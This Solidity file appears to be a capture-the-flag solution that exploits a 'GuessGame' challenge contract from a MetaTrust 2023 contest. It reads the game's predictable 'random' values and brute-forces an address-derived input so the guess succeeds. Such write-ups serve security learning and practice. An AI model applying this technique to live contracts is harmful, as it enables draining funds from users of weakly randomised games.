// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./GuessGame.sol";

contract GuessGameAttackMetaTrust23 {
    A public a ;
    GuessGame public guessGame;
    GuessGameSetUpMetaTrust23 public setup;
    function attack(address target) public payable {
        setup = GuessGameSetUpMetaTrust23(target);
        a = setup.a();
        guessGame = setup.guessGame();
        // console.log(guessGame.random01()); // 1
        // console.log(guessGame.random02()); // 2
        // console.log(guessGame.random03()); // 32  or read their value by decompiling
        // console.log(a.number());  // 10

        uint v2 = 0;
        while (v2 < 256) {
            uint256 y = (uint160(address(this)) + 1 + 2 + 32 + v2) & 0xff;
            if (y == 2) {
                break;
            }
            v2 += 1;
        }
        guessGame.guess{value:1}(0x60, v2, 3, 10);

        
    }

    receive() external payable {}
}